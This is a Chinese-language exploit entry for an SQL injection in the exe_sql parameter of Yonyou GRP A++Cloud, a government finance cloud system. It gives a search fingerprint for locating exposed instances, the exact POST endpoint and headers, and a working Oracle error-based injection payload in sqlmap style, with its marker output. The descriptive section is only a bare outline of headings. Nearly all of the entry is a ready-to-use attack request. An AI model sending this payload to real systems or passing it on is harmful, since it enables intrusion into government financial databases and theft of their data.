# 用友GRPA++Cloud政府财务云exe_sql存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="/pf/portal/login/css/fonts/style.css"`
- **请求**：`POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 279`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
exe_sql=(SELECT UPPER(XMLType(CHR(60)CHR(58)CHR(113)CHR(122)CHR(107)CHR(106)CHR(113)(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)CHR(113)CHR(98)CHR(118)CHR(107)CHR(113)CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
qzkjq1qbvkq
sqlmap
POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
Host: {hostname}
Content-Length: 279
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
exe_sql=1&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
```

**其他**
- 用友GRP A++Cloud政府财务云exe\_sql存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP A++Cloud政府财务云